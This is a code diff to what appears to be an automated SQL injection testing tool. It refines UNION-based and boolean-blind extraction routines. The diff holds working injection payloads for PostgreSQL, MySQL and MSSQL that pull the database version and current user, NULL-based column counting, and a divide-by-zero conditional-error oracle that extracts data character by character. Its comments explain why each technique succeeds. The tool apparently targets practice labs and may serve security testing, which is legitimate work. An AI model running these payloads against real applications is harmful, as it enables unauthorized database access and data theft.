@@ -67,27 +67,32 @@ def _error_based(sandbox, t, and_pre, suf, headers) -> tuple[str | None, str]:
 
 
 def _union_based(sandbox, t, union_pre, suf, headers) -> tuple[str | None, str]:
-    # concat forms to drop the value into a reflectable column, by dialect
-    val_exprs = (
-        (f"'{_W}'||version()||'/'||current_user||'{_W}'", "postgresql/oracle"),
-        (f"concat('{_W}',version(),0x2f,current_user(),'{_W}')", "mysql"),
-        (f"'{_W}'+@@version+'/'+system_user+'{_W}'", "mssql"),
-    )
+    # 1) find the column count with ALL-NULL columns (NULL is type-compatible with any
+    #    column, so the correct count returns a non-error page while a wrong count errors).
+    #    Injecting a string into every column instead would type-mismatch on numeric/date
+    #    columns and just 500 — the historical reason UNION extraction failed on Postgres.
+    ncols = None
     for n in range(1, 11):
-        markers = [f"owlU{i}z" for i in range(n)]
-        sel = ",".join(f"'{mk}'" for mk in markers)
-        _st, body = _resp(sandbox, t, f"{union_pre} UNION SELECT {sel}{suf}", headers)
-        hit = next((i for i, mk in enumerate(markers) if mk in body), None)
-        if hit is None:
-            continue
-        for valexpr, dial in val_exprs:
-            slot = [f"'{mk}'" for mk in markers]
-            slot[hit] = valexpr
+        st, _ = _resp(sandbox, t, f"{union_pre} UNION SELECT {','.join(['NULL'] * n)}{suf}", headers)
+        if st and st < 500:
+            ncols = n
+            break
+    if not ncols:
+        return None, ""
+    # 2) drop the wrapped value into one column at a time until it echoes in the body
+    val_exprs = (
+        ("postgresql", f"'{_W}'||version()||'/'||current_user||'{_W}'"),
+        ("mysql", f"concat('{_W}',version(),0x2f,current_user(),'{_W}')"),
+        ("mssql", f"'{_W}'+@@version+'/'+system_user+'{_W}'"),
+    )
+    for col in range(ncols):
+        for dial, valexpr in val_exprs:
+            slot = ["NULL"] * ncols
+            slot[col] = valexpr
             _st, body = _resp(sandbox, t, f"{union_pre} UNION SELECT {','.join(slot)}{suf}", headers)
             val = _find_wrapped(body, "")
             if val and len(val) >= 3:
-                return val, f"union-based ({n} cols, col {hit + 1}, {dial})"
-        return None, ""     # found column count but value didn't echo — stop probing wider
+                return val, f"union-based ({ncols} cols, col {col + 1}, {dial})"
     return None, ""
 
 
@@ -97,14 +102,31 @@ def _sig(status: int, body: str) -> tuple[int, int]:
 
 
 def _boolean_blind(sandbox, t, and_pre, suf, headers) -> tuple[str | None, str]:
-    # Establish a distinguishable TRUE vs FALSE response, else blind extraction is impossible.
-    t_sig = _sig(*_resp(sandbox, t, f"{and_pre} AND 1=1{suf}", headers))
-    f_sig = _sig(*_resp(sandbox, t, f"{and_pre} AND 1=2{suf}", headers))
-    if t_sig == f_sig:
-        return None, ""
+    # Primary oracle: a CONDITIONAL ERROR — a false condition forces divide-by-zero, so the
+    # response flips 200<->500 regardless of whether the injected value is a "valid" one.
+    # This is value-agnostic, unlike comparing content length for a made-up base value (the
+    # reason blind extraction missed the ginandjuice `category` SQLi, where `category=1` is
+    # not a real category so true/false looked identical). 1/0 errors on PG/MySQL/MSSQL/Oracle.
+    def _cond(c: str) -> str:
+        return f"{and_pre} AND 1/(case when ({c}) then 1 else 0 end)=1{suf}"
 
-    def truth(cond: str) -> bool:
-        return _sig(*_resp(sandbox, t, f"{and_pre} AND {cond}{suf}", headers)) == t_sig
+    t_sig = _sig(*_resp(sandbox, t, _cond("1=1"), headers))
+    f_sig = _sig(*_resp(sandbox, t, _cond("1=2"), headers))
+    if t_sig != f_sig:
+        how = "boolean-blind (conditional error)"
+
+        def truth(c: str) -> bool:
+            return _sig(*_resp(sandbox, t, _cond(c), headers)) == t_sig
+    else:
+        # Fallback: a plain content-difference oracle (apps that show/hide rows, no error).
+        tt = _sig(*_resp(sandbox, t, f"{and_pre} AND 1=1{suf}", headers))
+        ff = _sig(*_resp(sandbox, t, f"{and_pre} AND 1=2{suf}", headers))
+        if tt == ff:
+            return None, ""
+        how = "boolean-blind"
+
+        def truth(c: str) -> bool:
+            return _sig(*_resp(sandbox, t, f"{and_pre} AND {c}{suf}", headers)) == tt
 
     sub = "substring((select version()),{i},1)"   # MySQL/Postgres/MSSQL; Oracle lacks version()
     out = []
@@ -121,7 +143,7 @@ def _boolean_blind(sandbox, t, and_pre, suf, headers) -> tuple[str | None, str]:
         out.append(chr(lo))
     val = "".join(out).strip()
     if len(val) >= 3:
-        return val, "boolean-blind"
+        return val, how
     return None, ""
 
 
